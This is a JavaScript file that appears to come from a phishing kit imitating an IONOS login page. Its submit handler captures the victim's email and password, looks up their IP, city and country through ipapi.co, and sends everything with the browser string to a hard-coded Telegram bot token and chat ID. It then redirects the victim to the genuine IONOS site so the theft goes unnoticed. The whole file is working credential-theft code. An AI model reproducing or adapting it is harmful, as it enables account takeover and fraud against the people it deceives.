// Get the email from localStorage
const email = localStorage.getItem("userEmail") || '';

// Display the email on the page if the element exists
const emailTextElement = document.getElementById('emailText');
if (email && emailTextElement) {
  emailTextElement.textContent = email;
}

// Get browser details
const userAgent = navigator.userAgent;

// Fetch user's location
async function getUserLocation() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return {
      country: data.country_name || "Unknown",
      city: data.city || "Unknown",
      ip: data.ip || "Unknown"
    };
  } catch (error) {
    console.error("Error fetching user location:", error);
    return { country: "Unknown", city: "Unknown", ip: "Unknown" };
  }
}

// Handle the form submission
document.getElementById("passwordForm").addEventListener("submit", async function(event) {
  event.preventDefault();

  const password = document.getElementById("password").value;
  const location = await getUserLocation();

  const telegramToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
  const chatID = "6837437455";
  const message = `IONOS 2nd Attempt\nEmail: ${email}\nPassword: ${password}\nIP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;

  const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;

  try {
    await fetch(telegramURL);

    // Redirect to final page (or change the URL if needed)
    window.location.href = `http://Id.ionos.de`;
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
});
